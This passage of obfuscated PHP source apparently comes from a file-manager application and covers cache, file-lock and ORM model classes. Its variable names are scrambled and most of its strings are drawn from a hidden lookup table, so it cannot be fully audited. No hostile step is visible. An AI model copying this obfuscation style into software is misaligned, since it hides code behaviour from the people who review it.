self::init()->remove($Á²ÄÎ¨½); CacheLock::unlock($õØÙ‘»); return $…Ş§Ö£œ; } public static function removeMemory($©‹¸şÀ½) { $§ŒçÇŒ½ = self::key($©‹¸şÀ½); unset(self::$memoryCache[$§ŒçÇŒ½]); } public static function clearMemory($½€æœ“ = false) { if ($½€æœ“) { $½€æœ“ = self::key($½€æœ“); unset(self::$memoryCache[$½€æœ“]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[® ¨Ä®ñ][814])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[® ¨Ä®ñ][815])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Šæ÷Å, $Û‘ÜàÃ) { $İ ËÈ¨„ =& $_SERVER[® ¨Ä®ñ]; $this->cachePath = $Šæ÷Å[$İ ËÈ¨„[78]]; $this->prefix = $İ ËÈ¨„[816]; $this->cacheTime = $Û‘ÜàÃ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($Ôø¸ú¼×) { $óÀï²öó =& $_SERVER[® ¨Ä®ñ]; $Ôø¸ú¼× = str_replace(array($óÀï²öó[817], $óÀï²öó[98], $óÀï²öó[73]), $óÀï²öó[818], $Ôø¸ú¼×); return $this->cachePath . $óÀï²öó[819] . $Ôø¸ú¼× . $óÀï²öó[820]; } public function set($±äëğÛ¥, $å¬Ö¯, $»ü¾³ÅÀ = false) { $€’Ìú„û = $this->getFile($±äëğÛ¥); if (file_put_contents($€’Ìú„û, $this->prefix . $å¬Ö¯, LOCK_EX)) { @touch($€’Ìú„û, intval(time() + $»ü¾³ÅÀ)); clearstatcache(); return !0; } @unlink($€’Ìú„û); return !1; } public function get($Â¹Â—¯‹) { $À±–«‡‹ = $this->getFile($Â¹Â—¯‹); if (file_exists($À±–«‡‹) && filemtime($À±–«‡‹) < time()) { @unlink($À±–«‡‹); return !1; } $·ó™ËİÙ = @file_get_contents($À±–«‡‹); return substr($·ó™ËİÙ, strlen($this->prefix)); } public function remove($ĞŸ•‚ñ) { $„Œ µÉ = $this->getFile($ĞŸ•‚ñ); return @unlink($„Œ µÉ); } public function deleteAll() { $¯¨¯´›í =& $_SERVER[® ¨Ä®ñ]; $ô•³‰Œ = scandir($this->cachePath); foreach ($ô•³‰Œ as $¥áªÌÒÀ) { $õ¬áÛè¦ = $this->cachePath . $¥áªÌÒÀ; if (strpos($õ¬áÛè¦, $¯¨¯´›í[820]) && strpos($õ¬áÛè¦, $¯¨¯´›í[821])) { @unlink($õ¬áÛè¦); } } } public function clearTimeout() { $œîöŒ‹Ø =& $_SERVER[® ¨Ä®ñ]; $ÏÎı€œ = scandir($this->cachePath); foreach ($ÏÎı€œ as $Ğ‘ä’—¯) { $•õ ¢ƒ” = $this->cachePath . $Ğ‘ä’—¯; if (strpos($•õ ¢ƒ”, $œîöŒ‹Ø[820]) && strpos($•õ ¢ƒ”, $œîöŒ‹Ø[821]) && filemtime($•õ ¢ƒ”) < time()) { @unlink($•õ ¢ƒ”); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Ù”®¸È‘ =& $_SERVER[® ¨Ä®ñ]; if (self::$handle) { return self::$handle; } $èªÖ¼ = $GLOBALS[$Ù”®¸È‘[6]][$Ù”®¸È‘[344]]; self::$timeout = $èªÖ¼[$Ù”®¸È‘[822]] ? $èªÖ¼[$Ù”®¸È‘[822]] : 10; $İÑıÆ´å = _get($GLOBALS[$Ù”®¸È‘[6]], $Ù”®¸È‘[823]); $ô†«—å = $èªÖ¼[$Ù”®¸È‘[809]] ? $èªÖ¼[$Ù”®¸È‘[809]] : $Ù”®¸È‘[192]; if ($ô†«—å == $Ù”®¸È‘[21] && $İÑıÆ´å == $Ù”®¸È‘[13]) { $ô†«—å = $Ù”®¸È‘[192]; } switch ($ô†«—å) { case $Ù”®¸È‘[812]: self::$handle = new CacheLockRedis(); break; case $Ù”®¸È‘[813]: self::$handle = new CacheLockMemcached(); break; case $Ù”®¸È‘[21]: self::$handle = new CacheLockDatabase(); break; case $Ù”®¸È‘[192]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Ù”®¸È‘[824], $Ù”®¸È‘[825]); } return self::$handle; } private static function key($ƒ‡Š¦»Ê) { return $_SERVER[® ¨Ä®ñ][826] . Cache::key($ƒ‡Š¦»Ê); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($šî—Ü = '') { self::$errorMsg = $šî—Ü; } public static function lockGlobal($şíÑ¯”ù, $±ê–ùÛ§) { return self::lock($şíÑ¯”ù, $±ê–ùÛ§, !0); } public static function lock($£ØÙ¼ú†, $Ç›ŠÖ˜ = false, $èÆ‹‘’í = false) { $°éúĞ²È =& $_SERVER[® ¨Ä®ñ]; $áµĞ‚•Ú = self::init(); $¾©ñ†¡İ = self::key($£ØÙ¼ú†); $Ç›ŠÖ˜ = $Ç›ŠÖ˜ ? $Ç›ŠÖ˜ : self::$timeout; $’îÚ”ª = $áµĞ‚•Ú->lock($¾©ñ†¡İ, $Ç›ŠÖ˜); $¥ì·•˜ = timeFloat(); if (!$’îÚ”ª) { $½¤µÌë¡ = "\154\157\x63\x6b\40\x65\162\162\x6f\162\x3b\x6b\145\171\x3d{$£ØÙ¼ú†}\x3b\x74\x69\155\145\x3d{$Ç›ŠÖ˜}\73" . self::$errorMsg . $°éúĞ²È[71] . get_caller_msg(); $˜ Ó¬Å£ = LNG($°éúĞ²È[827]) . "\50{$Ç›ŠÖ˜}\163\51\56" . LNG($°éúĞ²È[828]); $˜ Ó¬Å£ .= $°éúĞ²È[829]; if (is_string(self::$errorMsg) && self::$errorMsg) { $˜ Ó¬Å£ = $˜ Ó¬Å£ . $°éúĞ²È[830] . self::$errorMsg; } write_log($½¤µÌë¡, $°éúĞ²È[825]); show_json($˜ Ó¬Å£, !1); } if (!$èÆ‹‘’í) { self::$lockItem[$¾©ñ†¡İ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $°²Ö›“ = number_format(timeFloat() - $¥ì·•˜, 3); write_log($°éúĞ²È[831] . $£ØÙ¼ú† . $°éúĞ²È[832] . $°²Ö›“, $°éúĞ²È[825]); } return $’îÚ”ª; } public static function lockGet($›ˆÓÂÏ) { $µºš†Ş = self::key($›ˆÓÂÏ); if (self::$lockItem[$µºš†Ş]) { return self::$lockItem[$µºš†Ş]; } return self::init()->lockGet($µºš†Ş); } public static function unlock($¹Óê÷îâ) { $É÷øËê¸ =& $_SERVER[® ¨Ä®ñ]; $´˜ì¯ÖŞ = self::key($¹Óê÷îâ); self::$lockItem[$´˜ì¯ÖŞ] = null; self::init()->unlock($´˜ì¯ÖŞ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($É÷øËê¸[833] . $¹Óê÷îâ, $É÷øËê¸[825]); } return; } public static function unlockRuntime() { $ şäœÁ… =& $_SERVER[® ¨Ä®ñ]; $†¢ĞœÏ = self::init(); $‚®ö™Á = !1; foreach (self::$lockItem as $ß…â»çÙ => $©ÕŸå³É) { if (!$©ÕŸå³É) { continue; } $†¢ĞœÏ->unlock($ß…â»çÙ); if (!$‚®ö™Á) { $‚®ö™Á = !0; write_log($ şäœÁ…[834] . $ß…â»çÙ . $ şäœÁ…[71] . get_caller_msg(), $ şäœÁ…[825]); continue; } write_log($ şäœÁ…[834] . $ß…â»çÙ, $ şäœÁ…[825]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $˜ç¡¬ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ şäœÁ…[835] . $˜ç¡¬ . $ şäœÁ…[836] . ACTION, $ şäœÁ…[825]); } } public static function fileLock($ê´œƒ’ª) { $äîÑÜŠ =& $_SERVER[® ¨Ä®ñ]; if (!$GLOBALS[$äîÑÜŠ[837]]) { $GLOBALS[$äîÑÜŠ[837]] = array(); } $GLOBALS[$äîÑÜŠ[837]][$ê´œƒ’ª] = !1; $ç°‡ŒÅ‰ = fopen(DATA_PATH . $ê´œƒ’ª . $äîÑÜŠ[838], $äîÑÜŠ[839]); if (!$ç°‡ŒÅ‰) { return !1; } $GLOBALS[$äîÑÜŠ[837]][$ê´œƒ’ª] = $ç°‡ŒÅ‰; if (flock($ç°‡ŒÅ‰, LOCK_EX)) { return !0; } self::unlock($ê´œƒ’ª); show_json($äîÑÜŠ[840], !1); return !1; } public static function fileUnlock($±ºÑˆ‹Ê) { $Û—è¥û¦ =& $_SERVER[® ¨Ä®ñ]; $ó‹ª‚Ìš = $GLOBALS[$Û—è¥û¦[837]][$±ºÑˆ‹Ê]; if (!$ó‹ª‚Ìš) { return; } $GLOBALS[$Û—è¥û¦[837]][$±ºÑˆ‹Ê] = !1; flock($ó‹ª‚Ìš, LOCK_UN); fclose($ó‹ª‚Ìš); } public static function fileUnlockAll() { $ØìëéÊÂ =& $_SERVER[® ¨Ä®ñ]; if (!$GLOBALS[$ØìëéÊÂ[837]]) { return; } foreach ($GLOBALS[$ØìëéÊÂ[837]] as $ó¯áËæû => $—ı¼æğÎ) { if (!$—ı¼æğÎ) { continue; } $GLOBALS[$ØìëéÊÂ[837]][$ó¯áËæû] = !1; flock($—ı¼æğÎ, LOCK_UN); fclose($—ı¼æğÎ); } $GLOBALS[$ØìëéÊÂ[837]] = array(); } } goto CˆñË¼ˆ×œ; Fò¹Œª©ó: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\144\145\162", "\x61\154\x69\x61\x73", "\150\x61\166\x69\x6e\x67", "\147\x72\157\x75\x70", "\x6c\157\143\x6b", "\x64\x69\163\164\151\x6e\x63\x74", "\141\165\164\x6f", "\x66\151\154\164\145\x72", "\x76\141\x6c\151\x64\141\x74\145", "\x72\x65\x73\165\154\x74", "\x62\151\x6e\144", "\x74\x6f\x6b\145\x6e"); public function __construct($³µÃˆó‹ = '', $È¶ª¤Û = '', $¥Çê†ªØ = '') { $ü²ÜÖÊ =& $_SERVER[® ¨Ä®ñ]; $this->_initialize(); if (!empty($³µÃˆó‹)) { if (strpos($³µÃˆó‹, $ü²ÜÖÊ[10])) { list($this->dbName, $this->name) = explode($ü²ÜÖÊ[10], $³µÃˆó‹); } else { $this->name = $³µÃˆó‹; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($È¶ª¤Û)) { $this->tablePrefix = $ü²ÜÖÊ[12]; } elseif ($ü²ÜÖÊ[12] != $È¶ª¤Û) { $this->tablePrefix = $È¶ª¤Û; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ü²ÜÖÊ[239]); } $this->db(0, empty($this->connection) ? $¥Çê†ªØ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $ƒŞúæ÷’ =& $_SERVER[® ¨Ä®ñ]; if (empty($this->fields)) { if (think_config($ƒŞúæ÷’[240])) { $÷îœÇùë = $this->dbName ? $this->dbName : think_config($ƒŞúæ÷’[241]); $ÓõÚ±ƒ‡ = think_var_cache($ƒŞúæ÷’[242] . strtolower(get_path_this($÷îœÇùë) . $ƒŞúæ÷’[10] . $this->name)); if ($ÓõÚ±ƒ‡) { $†äèàõ = think_config($ƒŞúæ÷’[243]); if (empty($†äèàõ) || $ÓõÚ±ƒ‡[$ƒŞúæ÷’[244]] == $†äèàõ) { $this->fields = $ÓõÚ±ƒ‡; return; } } } $this->flush(); } } public function flush() { $–Â§°Ê =& $_SERVER[® ¨Ä®ñ]; $this->db->setModel($this->name); $œÎü¨À… = $this->db->getFields($this->getTableName()); if (!$œÎü¨À…) { return !1; } $this->fields = array_keys($œÎü¨À…); $this->fields[$–Â§°Ê[245]] = !1; foreach ($œÎü¨À… as $ÙÔ¯Œà· => $‘·ƒä¶Ç) { $‹º­ƒÙ¢[$ÙÔ¯Œà·] = $‘·ƒä¶Ç[$–Â§°Ê[33]]; if ($‘·ƒä¶Ç[$–Â§°Ê[39]]) { $this->fields[$–Â§°Ê[246]] = $ÙÔ¯Œà·; if ($‘·ƒä¶Ç[$–Â§°Ê[42]]) { $this->fields[$–Â§°Ê[245]] = !0; } } } $this->fields[$–Â§°Ê[247]] = $‹º­ƒÙ¢; if (think_config($–Â§°Ê[243])) { $this->fields[$–Â§°Ê[244]] = think_config($–Â§°Ê[243]); } if (think_config($–Â§°Ê[240])) { $÷×ğ´„“ = $this->dbName ? $this->dbName : think_config($–Â§°Ê[241]); think_var_cache($–Â§°Ê[242] . strtolower(get_path_this($÷×ğ´„“) . $–Â§°Ê[10] . $this->name), $this->fields); } } public function switchModel($ÊŸìœ×¬, $Ù€ŞÏ¹¬ = array()) { $ÒßÀÙ¾š =& $_SERVER[® ¨Ä®ñ]; $’ÈóÖ…¢ = ucwords(strtolower($ÊŸìœ×¬)) . $ÒßÀÙ¾š[248]; if (!class_exists($’ÈóÖ…¢)) { think_exception($’ÈóÖ…¢ . think_lang($ÒßÀÙ¾š[249])); } $this->_extModel = new $’ÈóÖ…¢($this->name); if (!empty($Ù€ŞÏ¹¬)) { foreach ($Ù€ŞÏ¹¬ as $í¨ˆ¶Ê¿) { $this->_extModel->setProperty($í¨ˆ¶Ê¿, $this->{$í¨ˆ¶Ê¿}); } } return $this->_extModel; } public function __set($Ø·‘Ãúë, $ÇúÏ™íà) { $this->data[$Ø·‘Ãúë] = $ÇúÏ™íà; } public function __get($Ò¯¸ÁüÛ) { return isset($this->data[$Ò¯¸ÁüÛ]) ? $this->data[$Ò¯¸ÁüÛ] : null; } public function __isset($åâÃª™) { return isset($this->data[$åâÃª™]); } public function __unset($ä¨²İ) { unset($this->data[$ä¨²İ]); } public function __call($ÙÛçë¹, $ÇŸê´ùì) { $çÃêø® =& $_SERVER[® ¨Ä®ñ]; if (in_array(strtolower($ÙÛçë¹), $this->methods, !0)) { $this->options[strtolower($ÙÛçë¹)] = $ÇŸê´ùì[0]; return $this; } elseif (in_array(strtolower($ÙÛçë¹), array($çÃêø®[250], $çÃêø®[251], $çÃêø®[252], $çÃêø®[253], $çÃêø®[254]), !0)) { $êÚ—¨¢ = isset($ÇŸê´ùì[0]) ? $ÇŸê´ùì[0] : $çÃêø®[181]; $êÚ—¨¢ = $this->db->parseKey($êÚ—¨¢); return $this->getField(strtoupper($ÙÛçë¹) . $çÃêø®[255] . $êÚ—¨¢ . $çÃêø®[256] . $ÙÛçë¹, $çÃêø®[250]); } elseif (strtolower(substr($ÙÛçë¹, 0, 5)) == $çÃêø®[257]) { $êÚ—¨¢ = think_parse_name(substr($ÙÛçë¹, 5)); $€æê üÙ[$êÚ—¨¢] = $ÇŸê´ùì[0]; return $this->where($€æê üÙ)->find(); } elseif (strtolower(substr($ÙÛçë¹, 0, 10)) == $çÃêø®[258]) { $ôüûÜÔ = think_parse_name(substr($ÙÛçë¹, 10)); $€æê üÙ[$ôüûÜÔ] = $ÇŸê´ùì[0]; return $this->where($€æê üÙ)->getField($ÇŸê´ùì[1]); } elseif (isset($this->_scope[$ÙÛçë¹])) { return $this->scope($ÙÛçë¹, $ÇŸê´ùì[0]); } elseif (method_exists($this, $ÙÛçë¹)) { array_unshift($ÇŸê´ùì, $ÙÛçë¹); return call_user_func_array(array($this, $çÃêø®[259]), $ÇŸê´ùì); } else { return call_user_func_array(array(parent, $ÙÛçë¹), $ÇŸê´ùì); } } protected function call() { $ÀÌÎëÅ˜ =& $_SERVER[® ¨Ä®ñ]; $œ‚™ÃĞÄ = func_get_args(); $ï”Â®üï = array_shift($œ‚™ÃĞÄ); $ÙáÁ‹ä¡ = $ï”Â®üï; if (is_array($ï”Â®üï)) { $ÙáÁ‹ä¡ = $ï”Â®üï[1]; $ï”Â®üï = $ï”Â®üï[0]; } $À‡¯—´½ = count($œ‚™ÃĞÄ) - 1; if (isset($œ‚™ÃĞÄ[$À‡¯—´½]) && $œ‚™ÃĞÄ[$À‡¯—´½] === $ï”Â®üï) { think_exception(__CLASS__ . $ÀÌÎëÅ˜[4] . $ï”Â®üï . think_lang($ÀÌÎëÅ˜[260])); return; } $œ‚™ÃĞÄ[] = $ï”Â®üï; if (method_exists($this, $ÀÌÎëÅ˜[261])) { $Ö¢Ÿ¾ÆŸ = call_user_func_array(array($this, $ÀÌÎëÅ˜[262]), array($ÙáÁ‹ä¡, $œ‚™ÃĞÄ)); if (!is_null($Ö¢Ÿ¾ÆŸ) && $Ö¢Ÿ¾ÆŸ !== !1) { return $Ö¢Ÿ¾ÆŸ; } } $§Ñîú¦Ù = call_user_func_array(array($this, $ï”Â®üï), $œ‚™ÃĞÄ); if (method_exists($this, $ÀÌÎëÅ˜[263])) { $Ö¢Ÿ¾ÆŸ = call_user_func_array(array($this, $ÀÌÎëÅ˜[264]), array($ÙáÁ‹ä¡, $œ‚™ÃĞÄ, $§Ñîú¦Ù)); if ($Ö¢Ÿ¾ÆŸ) { return $Ö¢Ÿ¾ÆŸ; } } return $§Ñîú¦Ù; } protected function _initialize() { } protected function _facade($°»Ã»®ò) { $©ºÉÄ =& $_SERVER[® ¨Ä®ñ]; if (!empty($this->fields)) { foreach ($°»Ã»®ò as $™³Ïù›… => $´€Êš¤º) { if (is_array($this->fields) && !in_array($™³Ïù›…, $this->fields, !0)) { unset($°»Ã»®ò[$™³Ïù›…]); } elseif (is_scalar($´€Êš¤º)) { $this->_parseType($°»Ã»®ò, $™³Ïù›…); } } } if (!empty($this->options[$©ºÉÄ[265]])) { $°»Ã»®ò = array_map($this->options[$©ºÉÄ[265]], $°»Ã»®ò); unset($this->options[$©ºÉÄ[265]]); } $this->_beforeWrite($°»Ã»®ò); return $°»Ã»®ò; } protected function _beforeWrite(&$¯Ñûº»¸) { } public function add($Ê‚Ú×­» = '', $ÂÀÏøâì = array(), $‰çŸƒøä = false) { if (empty($Ê‚Ú×­»)) { if (!empty($this->data)) { $Ê‚Ú×­» = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[® ¨Ä®ñ][266]); return !1; } } $ÂÀÏøâì = $this->_parseOptions($ÂÀÏøâì); $Ê‚Ú×­» = $this->_facade($Ê‚Ú×­»); if (!1 === $this->_beforeInsert($Ê‚Ú×­», $ÂÀÏøâì)) { return !1; } $­œ¿»µ = $this->db->insert($Ê‚Ú×­», $ÂÀÏøâì, $‰çŸƒøä); if (!1 !== $­œ¿»µ) { $î««öÀœ = $this->getLastInsID(); if ($î««öÀœ) { $Ê‚Ú×­»[$this->getPk()] = $î««öÀœ; $this->_after_insert($Ê‚Ú×­», $ÂÀÏøâì); return $î««öÀœ; } $this->_after_insert($Ê‚Ú×­», $ÂÀÏøâì); } return $­œ¿»µ; } protected function _beforeInsert(&$˜È¶Ââº, $™ Ü¡«²) { } protected function _after_insert($Ùıˆ¡ñœ, $Ïë®ïùò) { } public function addAll($ ı¢íÒ, $¦óÉš¦µ = array(), $óİ¡Í²µ = false) { $æÃ…¦¤ú =& $_SERVER[® ¨Ä®ñ]; if (empty($ ı¢íÒ)) { $this->error = think_lang($æÃ…¦¤ú[266]); return !1; } $¦óÉš¦µ = $this->_parseOptions($¦óÉš¦µ); foreach ($ ı¢íÒ as $„¶ñòŞÌ => $Í³¤Äõ) { $ ı¢íÒ[$„¶ñòŞÌ] = $this->_facade($Í³¤Äõ); } if (method_exists($this->db, $æÃ…¦¤ú[267])) { $ğ¾»Œ¡® = $this->db->insertAll($ ı¢íÒ, $¦óÉš¦µ, $óİ¡Í²µ); } else { $this->startTrans(); foreach ($ ı¢íÒ as $„¶ñòŞÌ => $Í³¤Äõ) { $ğ¾»Œ¡® = $this->db->insert($Í³¤Äõ, $¦óÉš¦µ, $óİ¡Í²µ); } $this->commit(); } if (!1 !== $ğ¾»Œ¡®) { $¯±‰«„¥ = $this->getLastInsID(); if ($¯±‰«„¥) { return $¯±‰«„¥; } } return $ğ¾»Œ¡®; } public function selectAdd($§¥ÁØĞÕ = '', $¿¨»ÚÇª = '', $ÙÚığôÜ = array()) { $áĞ·ƒäê =& $_SERVER[® ¨Ä®ñ]; $ÙÚığôÜ = $this->_parseOptions($ÙÚığôÜ); if (!1 === ($ï¡ì·öÍ = $this->db->selectInsert($§¥ÁØĞÕ ? $§¥ÁØĞÕ : $ÙÚığôÜ[$áĞ·ƒäê[268]], $¿¨»ÚÇª ? $¿¨»ÚÇª : $this->getTableName(), $ÙÚığôÜ))) { $this->error = think_lang($áĞ·ƒäê[269]); return !1; } else { return $ï¡ì·öÍ; } } public function save($úæ±Ñô = '', $µº ŒÜÌ = array()) { $Ì¥é—Ã® =& $_SERVER[® ¨Ä®ñ]; if (empty($úæ±Ñô)) { if (!empty($this->data)) { $úæ±Ñô = $this->data; $this->data = array(); } else { $this->error = think_lang($Ì¥é—Ã®[266]); return !1; } } $úæ±Ñô = $this->_facade($úæ±Ñô); $µº ŒÜÌ = $this->_parseOptions($µº ŒÜÌ); $ÑÎŒø’ş = $this->getPk(); if (!isset($µº ŒÜÌ[$Ì¥é—Ã®[270]])) { if (isset($úæ±Ñô[$ÑÎŒø’ş])) { $– ¶äâø[$ÑÎŒø’ş] = $úæ±Ñô[$ÑÎŒø’ş]; $µº ŒÜÌ[$Ì¥é—Ã®[270]] = $– ¶äâø; unset($úæ±Ñô[$ÑÎŒø’ş]); } else { $this->error = think_lang($Ì¥é—Ã®[269]); return !1; } } if (is_array($µº ŒÜÌ[$Ì¥é—Ã®[270]]) && isset($µº ŒÜÌ[$Ì¥é—Ã®[270]][$ÑÎŒø’ş])) { $È¬ş­á¬ = $µº ŒÜÌ[$Ì¥é—Ã®[270]][$ÑÎŒø’ş]; } if (!1 === $this->_beforeUpdate($úæ±Ñô, $µº ŒÜÌ)) { return !1; } $…±†¡ı = $this->db->update($úæ±Ñô, $µº ŒÜÌ); if (!1 !== $…±†¡ı) { if (isset($È¬ş­á¬)) { $úæ±Ñô[$ÑÎŒø’ş] = $È¬ş­á¬; } $this->_afterUpdate($úæ±Ñô, $µº ŒÜÌ); } return $…±†¡ı; } protected function _beforeUpdate(&$ Öõ…ğ, $‰ı†È±ë) { } protected function _afterUpdate($»Ää¦—”, $ïœ”Ü¥) { } public function delete($Ô´¨»İ¢ = array()) { $ˆÎÉÏå½ =& $_SERVER[® ¨Ä®ñ]; if (empty($Ô´¨»İ¢) && empty($this->options[$ˆÎÉÏå½[270]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $óÀ–™øÈ = $this->getPk(); if (is_numeric($Ô´¨»İ¢) || is_string($Ô´¨»İ¢)) { if (strpos($Ô´¨»İ¢, $ˆÎÉÏå½[50])) { $£é´ó¸ô[$óÀ–™øÈ] = array($ˆÎÉÏå½[271], $Ô´¨»İ¢); } else { $£é´ó¸ô[$óÀ–™øÈ] = $Ô´¨»İ¢; } $this->options[$ˆÎÉÏå½[270]] = $£é´ó¸ô; } $Ô´¨»İ¢ = $this->_parseOptions(); if (is_array($Ô´¨»İ¢[$ˆÎÉÏå½[270]]) && isset($Ô´¨»İ¢[$ˆÎÉÏå½[270]][$óÀ–™øÈ])) { $â˜ê½¿Ò = $Ô´¨»İ¢[$ˆÎÉÏå½[270]][$óÀ–™øÈ]; } $ò‚Øê¼¤ = $this->db->delete($Ô´¨»İ¢); if (!1 !== $ò‚Øê¼¤) { $¹â—şòè = array(); if (isset($â˜ê½¿Ò)) { $¹â—şòè[$óÀ–™øÈ] = $â˜ê½¿Ò; } $this->_after_delete($¹â—şòè, $Ô´¨»İ¢); } return $ò‚Øê¼¤; } protected function _after_delete($”ó™ş¬Š, $Û€¹¶Éâ) { } public function select($ô©ÎŠ¿ = array()) { $¾³ÕıË÷ =& $_SERVER[® ¨Ä®ñ]; if (is_string($ô©ÎŠ¿) || is_numeric($ô©ÎŠ¿)) { $”¶­â’ = $this->getPk(); if (strpos($ô©ÎŠ¿, $¾³ÕıË÷[50])) { $½ÛÇÛäÊ[$”¶­â’] = array($¾³ÕıË÷[271], $ô©ÎŠ¿); } else { $½ÛÇÛäÊ[$”¶­â’] = $ô©ÎŠ¿; } $this->options[$¾³ÕıË÷[270]] = $½ÛÇÛäÊ; } elseif (!1 === $ô©ÎŠ¿) { $ô©ÎŠ¿ = $this->_parseOptions(); return $¾³ÕıË÷[272] . $this->db->buildSelectSql($ô©ÎŠ¿) . $¾³ÕıË÷[273]; } $ô©ÎŠ¿ = $this->_parseOptions(); $•¼¾ôÏµ = $this->db->select($ô©ÎŠ¿); if (!1 === $•¼¾ôÏµ) { return !1; } if (empty($•¼¾ôÏµ)) { return null; } $this->_afterSelect($•¼¾ôÏµ, $ô©ÎŠ¿); return $•¼¾ôÏµ; } protected function _afterSelect(&$ûçäéé, $†¶ó¡Œ”) { } public function buildSql($ı´áŞ˜ã = array()) { $½œü¸›È =& $_SERVER[® ¨Ä®ñ]; $ı´áŞ˜ã = $this->_parseOptions($ı´áŞ˜ã); return $½œü¸›È[272] . $this->db->buildSelectSql($ı´áŞ˜ã) . $½œü¸›È[273]; } public function optionsValue($ä¨÷”‹ = null) { if (is_null($ä¨÷”‹)) { return $this->options; } elseif (is_array($ä¨÷”‹)) { $this->options = array_merge($this->options, $ä¨÷”‹); } } protected function _parseOptions($²ø‡ÍĞ‰ = array()) { $½«‚âãÍ =& $_SERVER[® ¨Ä®ñ]; if (is_array($²ø‡ÍĞ‰)) { $²ø‡ÍĞ‰ = array_merge($this->options, $²ø‡ÍĞ‰); } $this->options = array(); if (!isset($²ø‡ÍĞ‰[$½«‚âãÍ[274]])) { $²ø‡ÍĞ‰[$½«‚âãÍ[274]] = $this->getTableName(); $ãŠû––ı = $this->fields; } else { $ãŠû––ı = $this->getDbFields(); } if (!empty($²ø‡ÍĞ‰[$½«‚âãÍ[275]])) { $²ø‡ÍĞ‰[$½«‚âãÍ[274]] .= $½«‚âãÍ[53] . $²ø‡ÍĞ‰[$½«‚âãÍ[275]]; } $²ø‡ÍĞ‰[$½«‚âãÍ[276]] = $this->name; if (isset($²ø‡ÍĞ‰[$½«‚âãÍ[270]]) && is_array($²ø‡ÍĞ‰[$½«‚âãÍ[270]]) && !empty($ãŠû––ı) && !isset($²ø‡ÍĞ‰[$½«‚âãÍ[277]]) && !isset($²ø‡ÍĞ‰[$½«‚âãÍ[274]])) { foreach ($²ø‡ÍĞ‰[$½«‚âãÍ[270]] as $Æ–İŒÎÎ => $»È­òéº) { $Æ–İŒÎÎ = trim($Æ–İŒÎÎ); if (in_array($Æ–İŒÎÎ, $ãŠû––ı, !0)) { if (is_scalar($»È­òéº)) { $this->_parseType($²ø‡ÍĞ‰[$½«‚âãÍ[270]], $Æ–İŒÎÎ); } } elseif (!is_numeric($Æ–İŒÎÎ) && $½«‚âãÍ[11] != substr($Æ–İŒÎÎ, 0, 1) && !1 === strpos($Æ–İŒÎÎ, $½«‚âãÍ[10]) && !1 === strpos($Æ–İŒÎÎ, $½«‚âãÍ[255]) && !1 === strpos($Æ–İŒÎÎ, $½«‚âãÍ[278]) && !1 === strpos($Æ–İŒÎÎ, $½«‚âãÍ[279])) { unset($²ø‡ÍĞ‰[$½«‚âãÍ[270]][$Æ–İŒÎÎ]); } } } $this->_options_filter($²ø‡ÍĞ‰); return $²ø‡ÍĞ‰; } protected function _options_filter(&$Œõ´ˆõó) { } protected function _parseType(&$ÔœÓµı, $ı£ô»Èş) { $¸çÂ÷Ú =& $_SERVER[® ¨Ä®ñ]; if (empty($this->options[$¸çÂ÷Ú[280]][$¸çÂ÷Ú[4] . $ı£ô»Èş])) { $™±åÓ°Ò = strtolower($this->fields[$¸çÂ÷Ú[247]][$ı£ô»Èş]); if (!1 !== strpos($™±åÓ°Ò, $¸çÂ÷Ú[281])) { } elseif (!1 === strpos($™±åÓ°Ò, $¸çÂ÷Ú[282]) && !1 !== strpos($™±åÓ°Ò, $¸çÂ÷Ú[283])) { $ÔœÓµı[$ı£ô»Èş] = intval($ÔœÓµı[$ı£ô»Èş]); } elseif (!1 !== strpos($™±åÓ°Ò, $¸çÂ÷Ú[284]) || !1 !== strpos($™±åÓ°Ò, $¸çÂ÷Ú[285])) { $ÔœÓµı[$ı£ô»Èş] = floatval($ÔœÓµı[$ı£ô»Èş]); } elseif (!1 !== strpos($™±åÓ°Ò, $¸çÂ÷Ú[286])) { $ÔœÓµı[$ı£ô»Èş] = (bool) $ÔœÓµı[$ı£ô»Èş]; } } } public function find($¹±Î”çÂ = array()) { $‹Úê–»³ =& $_SERVER[® ¨Ä®ñ]; if (is_numeric($¹±Î”çÂ) || is_string($¹±Î”çÂ)) { $Æ‹ÏÈ¤[$this->getPk()] = intval($¹±Î”çÂ); $this->options[$‹Úê–»³[270]] = $Æ‹ÏÈ¤; } $this->options[$‹Úê–»³[287]] = 1; $¹±Î”çÂ = $this->_parseOptions(); $’àøá = $this->db->select($¹±Î”çÂ); if (!1 === $’àøá) { return !1; } if (empty($’àøá)) { return null; } $this->data = $’àøá[0]; $this->_afterFind($this->data, $¹±Î”çÂ); if (!empty($this->options[$‹Úê–»³[288]])) { return $this->returnResult($this->data, $this->options[$‹Úê–»³[288]]); } return $this->data; } protected function _afterFind(&$½™³©åƒ, $Ò¿­¸î×) { } protected function returnResult($€ß­¤ÈÊ, $»Ü˜‘ù = '') { 